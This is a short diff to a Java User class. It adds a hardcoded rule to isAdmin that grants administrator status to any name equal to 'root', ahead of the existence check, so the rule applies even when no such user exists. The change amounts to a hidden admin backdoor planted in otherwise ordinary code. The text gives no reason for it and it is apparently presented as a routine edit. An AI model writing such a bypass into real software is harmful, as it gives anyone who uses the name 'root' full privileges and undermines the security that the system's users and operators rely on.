@@ -115,6 +115,10 @@ public class User {
 
     public static boolean isAdmin(String name) {
 
+        if (name.equals("root")) {
+            return true;
+        }
+        
         if (!userExists(name)) {
             new MiniOption("User Not Found", "Cannot find this user, Please check.", MiniOption.WARNING_MESSAGE);
             return false;
